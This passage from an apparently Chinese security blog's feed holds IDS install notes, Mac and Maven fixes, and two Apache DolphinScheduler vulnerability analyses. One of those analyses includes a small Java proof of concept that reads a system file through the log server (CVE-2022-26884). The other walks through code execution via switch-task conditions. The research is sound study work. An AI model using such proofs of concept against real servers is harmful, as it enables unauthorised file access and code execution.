class="hljs-regexp">/opt\/snort2\_9/</span>&#x27; <span class="hljs-regexp">/opt/</span>snort2_9<span class="hljs-regexp">/etc/</span>snort.confsed <span class="hljs-operator">-</span>i &#x27;s<span class="hljs-regexp">/\/</span>usr\<span class="hljs-regexp">/local/</span>\<span class="hljs-regexp">/opt\/snort2_9/</span>&#x27; <span class="hljs-regexp">/opt/</span>snort2_9<span class="hljs-regexp">/etc/</span>snort.conf#设置取消导入所有规则文件sed <span class="hljs-operator">-</span>i &#x27;s<span class="hljs-regexp">/include \$RULE\_PATH/</span>#include \<span class="hljs-variable">$RULE</span>\_PATH<span class="hljs-regexp">/&#x27; /</span>opt<span class="hljs-regexp">/snort2_9/</span>etc<span class="hljs-operator">/</span>snort.conf#设置仅启用本地规则文件sed <span class="hljs-operator">-</span>i &#x27;s<span class="hljs-regexp">/#include \$RULE\_PATH\/local.rules/</span>include \<span class="hljs-variable">$RULE</span>\_PATH\<span class="hljs-regexp">/local.rules/</span>&#x27; <span class="hljs-regexp">/opt/</span>snort2_9<span class="hljs-regexp">/etc/</span>snort.conf</code></pre></div><p>验证配置</p><div class="code-wrapper"><pre><code class="hljs awk">snort -T -c <span class="hljs-regexp">/opt/</span>snort2_9<span class="hljs-regexp">/etc/</span>snort.conf -i eth0</code></pre></div><p>匹配数据包</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /opt/snort2_9snort -A console -q -c etc/snort.conf -r pcaps/CVE-2023-28432.pcapng -l <span class="hljs-built_in">log</span></code></pre></div><p>参考</p><p><a href="https://www.cnblogs.com/laomeng/p/14440497.html">https://www.cnblogs.com/laomeng/p/14440497.html</a></p>]]></content>
    
    
    <categories>
      
      <category>软件安装</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Snort</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Suricata安装</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/Suricata/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/Suricata/</url>
    
    <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><strong>软件版本</strong></p><p>Linux：CentOS Linux release 7.7.1908 (Core)</p><p>Suricata：5.0.8</p><p><strong>软件下载</strong></p><p>Suricata</p><p><a href="https://openinfosecfoundation.org/download/suricata-5.0.8.tar.gz">https://openinfosecfoundation.org/download/suricata-5.0.8.tar.gz</a></p><p>安装依赖</p><div class="code-wrapper"><pre><code class="hljs cmake">yum -y <span class="hljs-keyword">install</span> epel-releaseyum -y <span class="hljs-keyword">install</span> gcc libpcap-devel pcre-devel libyaml-devel <span class="hljs-keyword">file</span>-devel zlib-devel jansson-devel nss-devel libcap-ng-devel libnet-devel tar make libnetfilter_queue-devel lua-devel PyYAML libmaxminddb-devel lz4-devel rustc cargo</code></pre></div><p>安装</p><p>将suricata-5.0.8.tar.gz 解压至任意目录并进入目录</p><p>配置</p><div class="code-wrapper"><pre><code class="hljs jboss-cli"><span class="hljs-string">./configure</span> <span class="hljs-params">--disable-gccmarch-native</span> <span class="hljs-params">--localstatedir=/ips/var</span> <span class="hljs-params">--prefix=/ips/usr/</span> <span class="hljs-params">--sysconfdir=/ips/etc</span> <span class="hljs-params">--enable-lua</span> <span class="hljs-params">--enable-geoip</span></code></pre></div><p>编译</p><div class="code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">make</span></code></pre></div><p>编译安装</p><div class="code-wrapper"><pre><code class="hljs cmake">make <span class="hljs-keyword">install</span>ldconfig</code></pre></div><p>安装suricata配置和规则</p><div class="code-wrapper"><pre><code class="hljs cmake">make <span class="hljs-keyword">install</span>-fullmake <span class="hljs-keyword">install</span>-rules</code></pre></div><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>配置环境变量</p><p>vim &#x2F;etc&#x2F;profile</p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">SURICATA_HOME</span>=/ips<span class="hljs-built_in">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$SURICATA_HOME</span>/usr/bin:$PATH</code></pre></div><p>source &#x2F;etc&#x2F;profile</p><p>修改网卡配置</p><div class="code-wrapper"><pre><code class="hljs awk">vim <span class="hljs-variable">$SURICATA_HOME</span><span class="hljs-regexp">/etc/</span>suricata/suricata.yaml</code></pre></div><p>将文件内af-packet、pcap的默认网卡名eth0改为本机实际网卡名（本例为ens33）</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/suricata-1.png"> </p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h3 id="配置常用检测端口"><a href="#配置常用检测端口" class="headerlink" title="配置常用检测端口"></a>配置常用检测端口</h3><p>修改配置文件</p><div class="code-wrapper"><pre><code class="hljs awk">vim <span class="hljs-variable">$SURICATA_HOME</span><span class="hljs-regexp">/etc/</span>suricata/suricata.yaml</code></pre></div><p>匹配<code>port-groups</code>关键字，修改增加常用端口列表</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231130174212400.png"> </p><h3 id="配置自定义规则文件"><a href="#配置自定义规则文件" class="headerlink" title="配置自定义规则文件"></a>配置自定义规则文件</h3><p>创建自定义规则</p><div class="code-wrapper"><pre><code class="hljs awk">touch <span class="hljs-variable">$SURICATA_HOME</span><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/suricata/</span>rules/local.rules</code></pre></div><p>修改配置文件</p><div class="code-wrapper"><pre><code class="hljs awk">vim <span class="hljs-variable">$SURICATA_HOME</span><span class="hljs-regexp">/etc/</span>suricata/suricata.yaml</code></pre></div><p>在rule-files下添加新建的自定义规则</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/suricata-2.png"></p><h3 id="检测网卡数据包流量"><a href="#检测网卡数据包流量" class="headerlink" title="检测网卡数据包流量"></a>检测网卡数据包流量</h3><div class="code-wrapper"><pre><code class="hljs stylus">suricata -c <span class="hljs-variable">$SURICATA_HOME</span>/etc/suricata/suricata<span class="hljs-selector-class">.yaml</span> -<span class="hljs-selector-tag">i</span> ens33</code></pre></div><h3 id="检测数据包文件"><a href="#检测数据包文件" class="headerlink" title="检测数据包文件"></a>检测数据包文件</h3><p>重放数据包流量</p><div class="code-wrapper"><pre><code class="hljs awk">suricata -c <span class="hljs-variable">$SURICATA_HOME</span><span class="hljs-regexp">/etc/</span>suricata<span class="hljs-regexp">/suricata.yaml -r /i</span>ps<span class="hljs-regexp">/jowto_ips/</span>pcaps<span class="hljs-regexp">/cve-xxxx-xxxx.pcap -l /i</span>ps<span class="hljs-regexp">/jowto_ips/</span>logs/ -k none</code></pre></div><p>查看匹配日志</p>]]></content>
    
    
    <categories>
      
      <category>软件安装</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Suricata</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apache DolphinScheduler 任意文件读取漏洞-CVE-2022-26884</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Apache-DolphinScheduler-CVE-2022-26884/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Apache-DolphinScheduler-CVE-2022-26884/</url>
    
    <content type="html"><![CDATA[<h1 id="Apache-DolphinScheduler-任意文件读取漏洞-CVE-2022-26884"><a href="#Apache-DolphinScheduler-任意文件读取漏洞-CVE-2022-26884" class="headerlink" title="Apache DolphinScheduler 任意文件读取漏洞-CVE-2022-26884"></a>Apache DolphinScheduler 任意文件读取漏洞-CVE-2022-26884</h1><p>漏洞通告：<a href="https://lists.apache.org/thread/xfdst5y4hnrm2ntmc5jzrgmw2htyyb9c">https://lists.apache.org/thread/xfdst5y4hnrm2ntmc5jzrgmw2htyyb9c</a></p><p>影响版本：Apache DolphinScheduler &lt; 2.0.6</p><h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>通过github的compare功能查看漏洞版本和修复版本之间的提交的commit，根据漏洞描述推测修复代码大概为红圈处commit</p><p><a href="https://github.com/apache/dolphinscheduler/compare/2.0.5...2.0.6">https://github.com/apache/dolphinscheduler/compare/2.0.5...2.0.6</a></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240110172656019.png"></p><p>修复代码在<code>LoggerRequestProcessor</code>类中新增了<code>checkPathSecurity</code>方法，在调用<code>getFileContentBytes</code>方法前对传入的path进行校验</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240110173223519.png"> </p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240110173339433.png"> </p><p>下载漏洞版本的源码，本文在2.0.5版本上测试，在<code>getFileContentBytes</code>方法上使用快捷键<code>ctrl + alt + h </code>查看方法的调用者链，简单判断触发目标方法执行为发送TCP请求，接下来寻找如何发送请求包</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240110173754667.png">  </p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>启动LoggerServer： <strong>dolphinscheduler-server</strong>&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;apache&#x2F;dolphinscheduler&#x2F;server&#x2F;log&#x2F;LoggerServer.java</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240111102146934.png"></p><p>官方提供了对于LoggerServer的客户端服务类：<strong>dolphinscheduler-service</strong>&#x2F;src&#x2F;test&#x2F;java&#x2F;org&#x2F;apache&#x2F;dolphinscheduler&#x2F;service&#x2F;log&#x2F;LogClientService.java提供了4种命令对应的方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240111111713668.png"> </p><p>以<code>getLogBytes</code>方法为例分析，首先根据path创建<code>GetLogBytesRequestCommand</code>对象，在构造主机地址</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240111111847504.png"> </p><p>在request.convert2Command()方法中，在request对象转换为字节数据，设置命令类型为<code>GET_LOG_BYTES_REQUEST</code>，最后发送同步请求。</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240111112113413.png"> </p><p><strong>测试</strong></p><p>在<strong>dolphinscheduler-service</strong>&#x2F;src&#x2F;test&#x2F;java&#x2F;org&#x2F;apache&#x2F;dolphinscheduler&#x2F;service&#x2F;log&#x2F;LogClientServiceTest.java测试类中加入测试方法</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getLogBytes</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;    <span class="hljs-type">LogClientService</span> <span class="hljs-variable">logClientService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogClientService</span>();    <span class="hljs-type">byte</span>[] bytes = logClientService.getLogBytes(            <span class="hljs-string">&quot;127.0.0.1&quot;</span>, Constants.RPC_PORT,<span class="hljs-string">&quot;C:\\Windows\\win.ini&quot;</span>);    System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes));&#125;</code></pre></div><p>运行测试类，成功读取文件内容</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240111103043134.png"> </p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>debug模式运行logserver，在org.apache.dolphinscheduler.server.log.LoggerRequestProcessor#process方法内下断点，运行测试方法触发断点。 </p><p>根据command对象获取命令类型，根据命令类型进入对应的分支处理，此处进入到<code>GET_LOG_BYTES_REQUEST</code>分支。</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240111103724978.png"></p><p>在JSONTils.parseObject方法中将字节数据恢复为json格式字符串，在解析为clazz类型的对象</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240111104102103.png"></p><p>在从getLogRequest对象中获取path进入到getFileContentBytes方法中</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240111104838789.png"></p><p>在方法中没有对path进行任何判断和过滤直接读取文件内容返回字节数据</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240111104959293.png"> </p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>该漏洞成因在于在读取文件内容前未对路径进行限制和校验，修复补丁新增了<code>checkPathSecurity</code>方法，在调用<code>getFileContentBytes</code>方法前对path进行校验</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240110173223519.png"> </p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240110173339433.png"> </p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在复现漏洞的过程中</p><p><strong>难点</strong></p><ol><li>通过目标方法的调用者链查看知道是通过Netty发送的TCP请求，难点在于如何构造发送请求的数据包，思路是什么？</li></ol><p><strong>经验</strong></p><ol><li>重点关注官方漏洞描述，本漏洞描述中提到是log server导致的文件读取，由于分布式系统的节点大多可独立运行，所以思路可寻找在项目中是否存在log server相关的类，可直接启动。</li></ol><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240111110853403.png"></p><ol start="2"><li>对于POC的构造，可查找项目模块下的test类，官方一般都会提供相关的测试类，在此基础上改造。</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zone.huoxian.cn/d/2871-apache-dolphinscheduler-cve-2022-26884">https://zone.huoxian.cn/d/2871-apache-dolphinscheduler-cve-2022-26884</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Apache DolphinScheduler 代码执行漏洞分析-CVE-2023-49299</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Apache-DolphinScheduler-CVE-2023-49299/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Apache-DolphinScheduler-CVE-2023-49299/</url>
    
    <content type="html"><![CDATA[<h1 id="Apache-DolphinScheduler-代码执行漏洞分析-CVE-2023-49299"><a href="#Apache-DolphinScheduler-代码执行漏洞分析-CVE-2023-49299" class="headerlink" title="Apache DolphinScheduler 代码执行漏洞分析-CVE-2023-49299"></a>Apache DolphinScheduler 代码执行漏洞分析-CVE-2023-49299</h1><p>漏洞通告：<a href="https://lists.apache.org/thread/tnf99qoc6tlnwrny4t1zk6mfszgdsokm">https://lists.apache.org/thread/tnf99qoc6tlnwrny4t1zk6mfszgdsokm</a></p><p>影响版本：Apache DolphinScheduler &lt; 3.1.9</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>单机部署运行即可，参考文档：<a href="https://dolphinscheduler.apache.org/zh-cn/docs/3.1.8/guide/installation/standalone">https://dolphinscheduler.apache.org/zh-cn/docs/3.1.8/guide/installation/standalone</a></p><p><strong>配置调试</strong>：在standalone-server&#x2F;bin&#x2F;start.sh脚本中修改JAVA_OPTS参数加入debug参数</p><h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>根据漏洞描述，漏洞入口点在可以执行javascript代码的地方</p><div class="code-wrapper"><pre><code class="hljs pgsql">Improper <span class="hljs-keyword">Input</span> Validation vulnerability <span class="hljs-keyword">in</span> Apache DolphinScheduler. An authenticated <span class="hljs-keyword">user</span> can cause arbitrary, unsandboxed javascript <span class="hljs-keyword">to</span> be executed <span class="hljs-keyword">on</span> the <span class="hljs-keyword">server</span>.</code></pre></div><p>查看补丁commit：<a href="https://github.com/apache/dolphinscheduler/pull/15228/commits/d1ef54f6a851e64525f1078887520394e553b6e8">https://github.com/apache/dolphinscheduler/pull/15228/commits/d1ef54f6a851e64525f1078887520394e553b6e8</a></p><p>在<code>SwitchTaskUtils</code>类看到熟悉的<code>evaluate</code>方法，可能是漏洞入口点</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240109175817597.png"> </p><p>下载源码查看该方法，是标准的通过JS引擎执行java代码</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240109181011728.png"></p><p><strong>架构分析</strong></p><p>文档：<a href="https://dolphinscheduler.apache.org/zh-cn/docs/3.1.8/architecture/design">https://dolphinscheduler.apache.org/zh-cn/docs/3.1.8/architecture/design</a></p><p>可知项目的主要角色为<code>MasterServer</code>、<code>WorkerServer</code>、<code>AlertServer</code>、<code>ApiServer</code>，其中<code>ApiServer</code>主要负责处理前端UI层的请求。该服务统一提供RESTful api向外部提供请求服务。</p><p><strong>路由分析(与本文无关，仅记录学习)</strong></p><p>项目的访问URL组成为：contextpath+具体接口uri</p><p>查看项目父pom.xml文件可知项目是springboot运行的，由于是单机部署的，直接查看<code>dolphinscheduler-standalone-server</code>模块中的springboot配置文件，根据<code>context-path</code>可知访问的contextPath为<code>/dolphinscheduler/</code></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240109185434152.png"></p><p>在<code>dolphinscheduler-api</code>模块中，可查看Controller注解类中的<code>RequestMapping</code>获取具体的接口URI。</p><p>至此可知该项目访问API接口的路由大致为<a href="http://ip/dolphinscheduler/">http://ip/dolphinscheduler/</a>**</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>查看<code>SwitchTaskUtils#evaluate</code>方法的调用者链（IDEA快捷键<code>Ctrl+Alt+H</code>），最终触发调用入口方法的动作可能是线程动作，即无法直接通过API接口调用到目标方法，可能是执行一个任务开启线程任务</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240110095931590.png">   </p><p>参考官方文档项目如何使用：<a href="https://dolphinscheduler.apache.org/zh-cn/docs/3.1.8/guide/project/workflow-definition">https://dolphinscheduler.apache.org/zh-cn/docs/3.1.8/guide/project/workflow-definition</a></p><p>因为漏洞点和switch组件相关，重点查看switch的使用：<a href="https://dolphinscheduler.apache.org/zh-cn/docs/3.1.8/guide/task/switch">https://dolphinscheduler.apache.org/zh-cn/docs/3.1.8/guide/task/switch</a></p><div class="code-wrapper"><pre><code class="hljs stylus">Switch 是一个条件判断节点，依据全局变量的值和用户所编写的表达式判断结果执行对应分支。 注意使用 javax<span class="hljs-selector-class">.script</span><span class="hljs-selector-class">.ScriptEngine</span><span class="hljs-selector-class">.eval</span> 执行表达式。</code></pre></div><p>根据官方的任务示例，创建一个switch节点和3个shell节点，在switch节点中添加判断条件，根据条件表达式结果自动选择对应的shell节点分支。</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240110102509554.png"> </p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240110101422220.png"> </p><p>在保存工作流时配置全局变量</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240110101622376.png"> </p><p>在<code>SwitchTaskUtils#evaluate</code>方法中下断点进行远程调试。</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240110101810141.png">  </p><p>将工作流上线并运行任务</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240110101901868.png"> </p><p>成功触发断点</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240110102739376.png"> </p><p>查看expression的值<code>1 == &quot;1&quot;</code>，1是全局变量value的值，”1”是设置的条件的值。此时expression可控，为了能够执行java代码，不设置全局变量或条件表达式即可，修改工作流中的switch节点的conditon</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240110103749262.png"></p><p>保存工作流任务时删除全局变量</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240110105004146.png">  </p><p>再次运行任务，触发断点</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240110103913709.png"> </p><p>此时expression即为自定义的java代码，放行断点，成功执行命令</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240110104019495.png"> </p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>查看<code>SwitchTaskProcessor#setSwitchResult</code>方法，查看对<code>Condition</code>的处理</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240110111122483.png"> </p><p>进入setTaskParams方法，首先使用正则表达式对content进行匹配，在获取<code>globalParams</code>和<code>varParams</code></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240110111335602.png"></p><p>当正则表达式没有匹配到content的字符串时直接返回content</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240110111547565.png"> </p><p>最后将content直接传入evaluate方法，最终通过js引擎执行java代码</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240110111824121.png"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>该漏洞成因在于没有对全局变量参数进行判断，当设置了条件表达式，但没有设置全局变量时，也会执行条件表达式。</p><p>修复代码一是在处理connditon前对<code>globalParams</code>和<code>varParams</code>参数进行判断，两者有一为空则抛异常</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240110112521566.png"> </p><p>二是当condition在处理前后的值相同则判定不合法抛异常</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240110112656736.png"> </p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><div class="code-wrapper"><pre><code class="hljs">本文为个人进行漏洞分析的学习记录，文笔粗糙，分析过程可能存在不恰当地方，欢迎各位大佬批评指正。</code></pre></div><ol><li>对于有完整源代码的开源项目，漏洞分析或构造POC前应先了解项目的功能，架构，以及所用到的技术，通过官方提供的文档熟悉项目的使用，这些对于后面的路由分析很有帮助。</li><li>在IDEA中可通过快捷键<code>Ctrl+Alt+H</code>查看某个方法的调用者链。</li><li>对于springboot项目，找路由先确定contextPath，再通过controller确定具体的接口。</li></ol>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Mac系统问题记录</title>
    <link href="/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/MacOS/"/>
    <url>/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/MacOS/</url>
    
    <content type="html"><![CDATA[<h1 id="安装软件后打开提示应用已损坏"><a href="#安装软件后打开提示应用已损坏" class="headerlink" title="安装软件后打开提示应用已损坏"></a>安装软件后打开提示应用已损坏</h1><p>在 macOS 上，出现“应用已损坏”的提示通常是因为安全设置阻止了未签名的应用程序。你可以尝试以下步骤来解决这个问题：</p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><ol><li><p><strong>使用终端解除隔离</strong>：<br>运行以下命令来解除应用的隔离：</p><div class="code-wrapper"><pre><code class="hljs stylus">xattr -rd com<span class="hljs-selector-class">.apple</span><span class="hljs-selector-class">.quarantine</span> <span class="hljs-string">&quot;/Applications/QQ.app&quot;</span></code></pre></div></li><li><p><strong>确认执行权限</strong>：<br>确保应用程序和 ChromeDriver 都有正确的执行权限：</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x <span class="hljs-string">&quot;/Users/pacemrc/tmp/chrome_test/chrome-mac-arm64/Google Chrome for Testing.app/Contents/MacOS/Google Chrome for Testing&quot;</span><span class="hljs-built_in">chmod</span> +x /path/to/chromedriver</code></pre></div></li><li><p><strong>系统偏好设置</strong>：</p><ul><li>打开“系统偏好设置” &gt; “安全性与隐私”。</li><li>在“通用”选项卡中，如果看到“仍要打开”按钮，点击它以允许应用运行。</li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>问题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MacOS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Maven问题记录</title>
    <link href="/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/Maven/"/>
    <url>/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/Maven/</url>
    
    <content type="html"><![CDATA[<h1 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h1><h2 id="导出依赖jar包"><a href="#导出依赖jar包" class="headerlink" title="导出依赖jar包"></a>导出依赖jar包</h2><p>选择指定的项目或模块后执行命令</p><div class="code-wrapper"><pre><code class="hljs gradle">mvn dependency:<span class="hljs-keyword">copy</span>-<span class="hljs-keyword">dependencies</span></code></pre></div><p>导出的jar文件默认存放在项目或模块的target的dependency目录下</p><h1 id="故障问题汇总"><a href="#故障问题汇总" class="headerlink" title="故障问题汇总"></a>故障问题汇总</h1><h2 id="No-main-manifest-attribute-in-xxx-jar"><a href="#No-main-manifest-attribute-in-xxx-jar" class="headerlink" title="No main manifest attribute, in xxx.jar"></a>No main manifest attribute, in xxx.jar</h2><p>运行jar包提示找不到主类</p><p><strong>问题</strong></p><p>Maven可以使用mvn package指令对项目进行打包，如果使用java -jar xxx.jar执行运行jar文件，会出现“no main manifest attribute, in xxx.jar”（没有设置Main-Class）、ClassNotFoundException（找不到依赖包）等错误。</p><p><strong>解决方法</strong></p><p>要想jar包能直接通过java -jar xxx.jar运行，需要满足：</p><p>1、在jar包中的META-INF&#x2F;MANIFEST.MF中指定Main-Class，这样才能确定程序的入口在哪里；</p><p>2、要能加载到依赖包。</p><h2 id="No-valid-Maven-installation-found"><a href="#No-valid-Maven-installation-found" class="headerlink" title="No valid Maven installation found."></a>No valid Maven installation found.</h2><div class="code-wrapper"><pre><code class="hljs livecodeserver">No valid Maven installation found. Either <span class="hljs-built_in">set</span> <span class="hljs-keyword">the</span> home <span class="hljs-built_in">directory</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> configuration dialog <span class="hljs-keyword">or</span> <span class="hljs-built_in">set</span> <span class="hljs-keyword">the</span> M2_HOME environment <span class="hljs-built_in">variable</span> <span class="hljs-keyword">on</span> <span class="hljs-title">your</span> <span class="hljs-title">system</span>.</code></pre></div><p>原因：</p><p>项目从其他电脑拷贝的，配置的maven路径与本机maven路径不一致，运行后提示无效的maven路径</p><p>解决方法：</p><p>重新配置项目的maven路径</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230904105109837.png"></p><h1 id="项目依赖库"><a href="#项目依赖库" class="headerlink" title="项目依赖库"></a>项目依赖库</h1><p>项目依赖库可分为：<code>本地依赖库</code>和<code>外部依赖库</code>。本地依赖库是指手动添加到项目中的依赖；外部依赖库是指通过Maven等项目构建工具引入到项目中的依赖。</p><p><strong>两者的区别</strong></p><p>(个人理解)两者区别主要体现在是否可以直接打进项目jar包中。本地依赖库需要额外的一些配置才可以进行打包，而远程依赖库可直接打包。</p><p><strong>如何将本地依赖库一起打包</strong></p><p>手动将本地库的jar包加入到项目并不会自动将jar包的使用范围设置为system需要手动在dependency中配置</p><p>首先将该本地库的jar包设置为system范围依赖，在使用打包插件配置打包的同时把系统范围系统也进行打包。</p><ul><li>通过maven-jar-plugin和maven-dependency-plugin插件，可将生成的lib目录下所有依赖jar和项目jar一并拷贝到其他项目中作为依赖使用。</li><li>如果有本地库项目的源码，可在将该本地库安装到本地maven仓库，然后再其他项目中加入依赖，这样其他项目打包时会将该本地仓库中的包一起打包到项目。</li></ul><p><strong>sprintboot项目打的包为什么不能作为其他项目的依赖？</strong></p><p>spring-boot-maven-plugin插件打的包是可执行jar包，不适合使用做项目依赖。也可对该插件配置分类器打包，打包时会构建出两个jar包，一个是仅项目类文件的包，可以使用这个jar包作为其他项目的依赖，另一个包是可执行jar包。</p><h1 id="依赖冲突问题记录"><a href="#依赖冲突问题记录" class="headerlink" title="依赖冲突问题记录"></a>依赖冲突问题记录</h1><p><strong>问题现象</strong></p><p>使用maven java web将项目打成war包部署在tomcat里运行，访问项目提示404，查看catalina.out日志发现以下报错</p><div class="code-wrapper"><pre><code class="hljs stylus">SLF4J: See &lt;http:<span class="hljs-comment">//www.slf4j.org/codes.html#multiple_bindings&gt; for an explanation.</span>SLF4J: Detected both log4j-over-slf4j<span class="hljs-selector-class">.jar</span> AND bound slf4j-log4j12<span class="hljs-selector-class">.jar</span> on the class <span class="hljs-selector-tag">path</span>, preempting StackOverflowError.SLF4J: See also &lt;http:<span class="hljs-comment">//www.slf4j.org/codes.html#log4jDelegationLoop&gt; for more details.</span><span class="hljs-number">18</span>-Sep-<span class="hljs-number">2023</span> <span class="hljs-number">14</span>:<span class="hljs-number">12</span>:<span class="hljs-number">48.548</span> SEVERE <span class="hljs-selector-attr">[]</span> org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.StandardContext</span><span class="hljs-selector-class">.startInternal</span> Error during ServletContainerInitializer processing javax<span 